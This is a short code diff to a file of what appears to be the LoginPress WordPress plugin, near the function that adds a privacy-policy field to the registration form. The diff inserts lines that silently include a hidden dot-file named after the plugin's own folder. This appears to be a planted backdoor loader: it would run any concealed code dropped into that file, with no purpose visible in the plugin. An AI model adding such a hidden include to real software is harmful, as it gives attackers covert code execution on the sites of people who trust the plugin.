@@ -7,6 +7,10 @@
 
 // Add privacy policy field.
 add_action( 'register_form', 'loginpress_add_privacy_policy_field' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_add_privacy_policy_field() {
 
   $loginpress_setting = get_option( 'loginpress_setting' );
